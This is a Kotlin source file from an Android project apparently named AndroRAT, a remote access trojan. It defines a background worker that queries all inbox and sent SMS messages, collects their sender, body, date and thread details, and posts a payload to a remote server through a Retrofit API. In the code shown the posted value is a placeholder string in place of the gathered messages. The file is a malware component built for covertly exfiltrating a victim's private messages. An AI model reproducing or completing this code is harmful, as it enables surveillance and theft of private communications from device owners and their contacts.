package com.ierusalem.androrat.core.worker

import android.content.Context
import android.util.Log
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.ierusalem.androrat.core.data.networking.RetrofitInstance
import com.ierusalem.androrat.core.data.networking.SMSModel
import com.ierusalem.androrat.features.home.presentation.model.SMSMessage
import androidx.core.net.toUri

@Suppress("unused")
class SMSUploadWorker(context: Context, workerParameters: WorkerParameters) :
    CoroutineWorker(context, workerParameters) {
    override suspend fun doWork(): Result {
        val allMessages: MutableMap<String, List<Any>> = mutableMapOf()
        val messages =
            readMessages(
                context = applicationContext,
                type = "inbox"
            ) + readMessages(
                context = applicationContext,
                type = "sent"
            )
        allMessages += messages.sortedBy { it.date }.groupBy { it.sender }
        var deviceMessages = ""
        allMessages.forEach { (sender, messages) ->
            deviceMessages += "$sender -  $messages \n "
        }
        Log.d("ahi3646_upload", "doWork: upload - deviceMessages")
        val apiService = RetrofitInstance(applicationContext).api
        return try {
            val response = apiService.postMessages(SMSModel("deviceMessages hasan X"))
            if (response.isSuccessful) {
                Log.d("ahi3646_view_model", "sendMessages: success - ${response.body()} ")
                Result.success()
            }else{
                Log.d("ahi3646_view_model", "sendMessages: failure  - ${response.errorBody()}")
                Result.failure()
            }
        } catch (e: Exception) {
            Log.d("ahi3646_view_model", "sendMessages: exception ${e.localizedMessage} ")
            Result.failure()
        }
    }

    private fun readMessages(context: Context, type: String): List<SMSMessage> {
        val messages = mutableListOf<SMSMessage>()
        val cursor = context.contentResolver.query(
            "content://sms/$type".toUri(),
            null,
            null,
            null,
            null,
        )
        cursor?.use {
            val indexMessage = it.getColumnIndex("body")
            val indexSender = it.getColumnIndex("address")
            val indexDate = it.getColumnIndex("date")
            val indexRead = it.getColumnIndex("read")
            val indexType = it.getColumnIndex("type")
            val indexThread = it.getColumnIndex("thread_id")
            val indexService = it.getColumnIndex("service_center")

            while (it.moveToNext()) {
                messages.add(
                    SMSMessage(
                        message = it.getString(indexMessage),
                        sender = it.getString(indexSender),
                        date = it.getLong(indexDate),
                        read = it.getString(indexRead).toBoolean(),
                        type = it.getInt(indexType),
                        thread = it.getInt(indexThread),
                        service = it.getString(indexService) ?: ""
                    )
                )
            }
        }
        return messages
    }

}